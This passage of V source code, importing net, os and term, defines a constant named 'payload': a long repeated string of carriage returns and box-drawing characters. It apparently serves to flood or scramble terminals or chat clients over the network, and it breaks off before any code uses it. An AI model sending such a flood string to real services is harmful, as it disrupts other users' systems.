import net
import os
import term

const (
	payload = "\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\r▦\r▨\r▪\r▭\r▮\r▯\r▰\r▲\r▴\r▶\r■\r□\r▢\r▣\r▤\